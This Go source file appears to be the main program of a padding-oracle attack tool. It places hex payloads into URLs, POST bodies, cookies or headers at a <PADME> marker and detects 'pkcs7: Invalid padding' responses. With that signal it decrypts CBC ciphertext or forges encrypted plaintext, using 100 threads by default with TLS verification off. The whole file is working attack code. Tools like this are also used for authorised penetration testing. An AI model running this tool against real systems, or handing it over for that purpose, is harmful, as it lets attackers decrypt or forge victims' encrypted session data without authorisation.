package main

import (
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"strings"
	"time"

	"github.com/bonzitechnology/padoracle/libpadoracle"
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "my string representation"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

// target implement the libpadoracle.Oracle interface
type target struct {
	Data    string
	URL     string
	Method  string
	Cookies string
	Headers string
	Client  *http.Client
	Debug   bool
}

type Resp struct {
	ResponseCode int
	BodyData     string
}

func (t target) Call(payload []byte) bool {
	// Encode the payload as hex
	encodedPayload := hex.EncodeToString(payload)

	for retry := 0; retry < 3; retry++ {
		reqURL := strings.Replace(t.URL, "<PADME>", encodedPayload, -1)
		reqData := strings.Replace(t.Data, "<PADME>", encodedPayload, -1)
		
		req, err := http.NewRequest(t.Method, reqURL, strings.NewReader(reqData))
		if err != nil {
			continue
		}

		// Set cookies
		req.Header.Set("Cookie", strings.Replace(t.Cookies, "<PADME>", encodedPayload, -1))
		
		// Set headers
		for _, h := range strings.Split(t.Headers, ";;") {
			if len(h) > 0 {
				kv := strings.SplitN(h, ":", 2)
				if len(kv) == 2 {
					key := strings.TrimSpace(strings.Replace(kv[0], "<PADME>", encodedPayload, -1))
					val := strings.TrimSpace(strings.Replace(kv[1], "<PADME>", encodedPayload, -1))
					req.Header.Set(key, val)
				}
			}
		}

		resp, err := t.Client.Do(req)
		if err != nil {
			time.Sleep(time.Duration(retry*100) * time.Millisecond)
			continue
		}
		defer resp.Body.Close()

		bodyBytes, _ := ioutil.ReadAll(resp.Body)
		body := string(bodyBytes)

		// Check response logic
		// The example server returns "pkcs7: Invalid padding" and a 500 error code
		isValid := !strings.Contains(body, "pkcs7: Invalid padding") && resp.StatusCode == 200
		
		if t.Debug {
			log.Printf(" [DEBUG] Status: %d | Valid: %v | URL: %s", resp.StatusCode, isValid, reqURL)
		}
		
		return isValid
	}
	return false
}

const (
	MaxIdleConnections int = 100
)

var DefaultDialer = &net.Dialer{
	Timeout:   30 * time.Second,
	KeepAlive: 30 * time.Second,
}

func main() {
	var cfg libpadoracle.Config
	var cipherTextHex string
	var plainText string
	var ivHex string
	var Url string
	var method string
	var data string
	var proxyUrl string
	var cookies string
	var ignoreTls bool
	var headers string
	var binaryMode bool

	flag.StringVar(&cipherTextHex, "c", "", "Provide the base ciphertext that you're trying to decipher (hex encoded)")
	flag.StringVar(&plainText, "p", "", "Provide the plaintext that you're trying to encrypt (for use with mode = 1)")
	flag.StringVar(&ivHex, "iv", "", "Optional: provide the IV for Block 0 of your ciphertext (hex encoded)")
	flag.StringVar(&cookies, "C", "", "Cookies for the request. Use '<PADME>' as a marker.")
	flag.IntVar(&cfg.BlockSize, "bs", 16, "Block size for the ciphertext (default 16)")
	flag.IntVar(&cfg.Threads, "T", 100, "Number of threads to use")
	flag.IntVar(&cfg.Sleep, "S", 0, "Sleep x milliseconds between requests")
	flag.StringVar(&cfg.BlockRange, "blocks", "1,-1", "Range of blocks to decrypt")
	flag.StringVar(&proxyUrl, "proxy", "", "Proxy URL")
	flag.StringVar(&Url, "u", "", "Target URL. Use '<PADME>' as a marker.")
	flag.StringVar(&method, "method", "GET", "HTTP method (default GET)")
	flag.StringVar(&headers, "headers", "", "Additional headers (double semicolon-delimited). Use '<PADME>' as a marker.")
	flag.StringVar(&data, "data", "", "POST data. Use '<PADME>' as a marker.")
	flag.IntVar(&cfg.Mode, "m", 0, "0 = Decrypt; 1 = Encrypt")
	flag.BoolVar(&cfg.Debug, "d", false, "Debug mode")
	flag.BoolVar(&binaryMode, "binary", false, "Binary mode (default ASCII)")
	flag.BoolVar(&ignoreTls, "k", true, "Ignore TLS errors (default true)")

	flag.Parse()

	if Url == "" {
		log.Fatal("No URL supplied. Use -u.")
	}

	// Decode ciphertext
	cipherText, err := hex.DecodeString(cipherTextHex)
	if err != nil {
		log.Fatalf("Invalid ciphertext hex: %v", err)
	}
	cfg.BaseCiphertext = cipherText

	// Decode IV if provided
	if ivHex != "" {
		iv, err := hex.DecodeString(ivHex)
		if err != nil {
			log.Fatalf("Invalid IV hex: %v", err)
		}
		cfg.IV = iv
	}

	cfg.TargetPlaintext = []byte(plainText)
	cfg.AsciiMode = !binaryMode

	httpTransport := &http.Transport{
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: ignoreTls},
		Dial:               DefaultDialer.Dial,
		MaxIdleConnsPerHost: MaxIdleConnections,
	}
	client := &http.Client{Transport: httpTransport}

	if proxyUrl != "" {
		pURL, err := url.Parse(proxyUrl)
		if err != nil {
			log.Fatal("Invalid proxy URL:", proxyUrl)
		}
		httpTransport.Proxy = http.ProxyURL(pURL)
	}

	cfg.Oracle = target{
		URL:     Url,
		Method:  method,
		Data:    data,
		Client:  client,
		Headers: headers,
		Cookies: cookies,
		Debug:   cfg.Debug,
	}

	if cfg.Debug {
		go func() {
			fmt.Println("Profiler running on: localhost:6060")
			http.ListenAndServe("localhost:6060", nil)
		}()
	}

	libpadoracle.Run(cfg)
}
